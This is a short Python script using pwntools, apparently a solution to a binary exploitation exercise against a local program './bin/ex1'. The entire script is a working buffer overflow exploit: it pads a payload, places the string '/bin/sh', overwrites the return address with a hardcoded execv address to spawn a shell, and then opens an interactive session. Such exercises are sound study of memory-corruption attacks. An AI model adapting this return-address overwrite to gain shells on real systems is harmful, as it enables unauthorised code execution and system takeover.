from pwn import *

target = process("./bin/ex1")

# p &execv
execv = 0x7ffff7e93f10

# int execv(const char *pathname, char *const argv[]);
argv = b'\0' * 8 + 56 * b'A'  # pt rsi => name = null

# depends on the chosen index; if index == 1
pathname = 64 * b'A' + b'/bin/sh\x00' + 56 * b'A' + 128 * b'A'  # pt rdi => airlines

# 0x401484 = puts address
payload = argv + pathname + b'B' * 16 + b'C' * 8 + p64(execv)

target.sendline("1")
target.sendline(payload)
target.interactive()
